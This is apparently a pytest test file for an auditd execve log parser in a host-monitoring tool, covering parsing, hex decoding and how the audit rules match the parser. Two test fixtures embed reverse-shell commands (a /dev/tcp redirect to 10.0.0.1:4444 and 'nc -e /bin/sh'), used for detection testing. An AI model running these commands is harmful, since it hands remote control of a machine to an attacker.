import os
import re

from auditd_source import _EXECVE_SYSCALLS, parse_event, _parse_kv, _parse_msg_ts

_RULES = os.path.abspath(
    os.path.join(
        os.path.dirname(__file__), "..", "..", "..", "deploy", "audit", "sentinel.rules"
    )
)

SYSCALL = (
    "type=SYSCALL msg=audit(1700000000.123:4567): arch=c000003e syscall=59 "
    "success=yes exit=0 ppid=1000 pid=1234 auid=0 uid=0 gid=0 "
    'comm="bash" exe="/usr/bin/bash" key="exec"'
)
EXECVE = (
    'type=EXECVE msg=audit(1700000000.123:4567): argc=3 a0="/bin/bash" a1="-c" a2="id"'
)


def test_parse_kv_handles_quoted_values():
    kv = _parse_kv(SYSCALL)
    assert kv["syscall"] == "59"
    assert kv["comm"] == "bash"
    assert kv["exe"] == "/usr/bin/bash"


def test_parse_msg_ts_is_iso_utc():
    assert _parse_msg_ts("audit(1700000000.123:4567)").startswith("2023-11-14T")
    assert _parse_msg_ts("audit(1700000000.123:4567)").endswith("+00:00")


def test_parse_event_builds_hostevent():
    ev = parse_event([SYSCALL, EXECVE])
    assert ev is not None
    assert ev["event_type"] == "execve"
    assert ev["pid"] == 1234
    assert ev["uid"] == 0
    assert ev["comm"] == "bash"
    assert ev["exe"] == "/usr/bin/bash"
    assert ev["args"] == ["/bin/bash", "-c", "id"]
    assert ev["raw"] == "\n".join([SYSCALL, EXECVE])


def test_parse_event_ignores_non_execve():
    line = 'type=SYSCALL msg=audit(1700000000.123:9): syscall=2 pid=5 uid=0 comm="cat"'
    assert parse_event([line]) is None


def test_hex_encoded_execve_arg_is_decoded():
    payload = "sh >& /dev/tcp/10.0.0.1/4444 0>&1"
    syscall = 'type=SYSCALL msg=audit(1700000000.1:1): syscall=59 pid=5 uid=0 comm="sh" exe="/bin/sh"'
    execve = f'type=EXECVE msg=audit(1700000000.1:1): argc=3 a0="sh" a1="-c" a2={payload.encode().hex()}'
    ev = parse_event([syscall, execve])
    assert ev["args"] == ["sh", "-c", payload]


def test_quoted_hexlike_arg_stays_literal():
    syscall = 'type=SYSCALL msg=audit(1.1:1): syscall=59 pid=1 uid=0 comm="x" exe="/x"'
    execve = 'type=EXECVE msg=audit(1.1:1): argc=1 a0="deadbeef"'
    ev = parse_event([syscall, execve])
    assert ev["args"] == ["deadbeef"]


def test_hex_encoded_comm_is_decoded():
    weird = "ev il"
    syscall = f'type=SYSCALL msg=audit(1.1:1): syscall=59 pid=1 uid=0 comm={weird.encode().hex()} exe="/x"'
    ev = parse_event([syscall])
    assert ev["comm"] == weird


def test_malformed_pid_uid_does_not_crash():
    syscall = (
        'type=SYSCALL msg=audit(1.1:1): syscall=59 pid=abc uid=xyz comm="x" exe="/x"'
    )
    ev = parse_event([syscall])
    assert ev["pid"] == 0 and ev["uid"] == 0


def test_unparseable_timestamp_is_empty_not_fabricated():
    syscall = 'type=SYSCALL msg=audit(BROKEN): syscall=59 pid=1 uid=0 comm="x" exe="/x"'
    ev = parse_event([syscall])
    assert ev["timestamp"] == ""


def test_rules_artifact_only_arms_syscalls_the_parser_consumes():
    """deploy/audit/sentinel.rules and parse_event are a contract: rules for
    syscalls outside _EXECVE_SYSCALLS emit records the pipeline silently
    drops. Adding a syscall to the ruleset requires teaching the parser first.
    """
    with open(_RULES) as fh:
        rules = [ln.strip() for ln in fh if ln.strip().startswith("-a")]
    assert rules, "sentinel.rules must arm at least one audit rule"
    for rule in rules:
        m = re.search(r"-S\s+(\S+)", rule)
        assert m, f"audit rule without a syscall filter: {rule}"
        for syscall in m.group(1).split(","):
            assert (
                syscall in _EXECVE_SYSCALLS
            ), f"{syscall!r} armed in sentinel.rules but parse_event drops it"
        assert "-k sentinel_exec" in rule, rule


def test_golden_record_as_emitted_under_the_rules_parses():
    """A SYSCALL+EXECVE pair shaped exactly like auditd output under the
    shipped ruleset (key="sentinel_exec") must build a HostEvent."""
    syscall = (
        "type=SYSCALL msg=audit(1751900000.123:99): arch=c000003e syscall=59 "
        "success=yes exit=0 ppid=1000 pid=1001 auid=1000 uid=1000 gid=1000 "
        'comm="nc" exe="/usr/bin/nc" key="sentinel_exec"'
    )
    execve = (
        "type=EXECVE msg=audit(1751900000.123:99): argc=4 "
        'a0="nc" a1="-e" a2="/bin/sh" a3="10.0.0.5"'
    )
    ev = parse_event([syscall, execve])
    assert ev is not None
    assert ev["comm"] == "nc"
    assert ev["exe"] == "/usr/bin/nc"
    assert ev["args"] == ["nc", "-e", "/bin/sh", "10.0.0.5"]
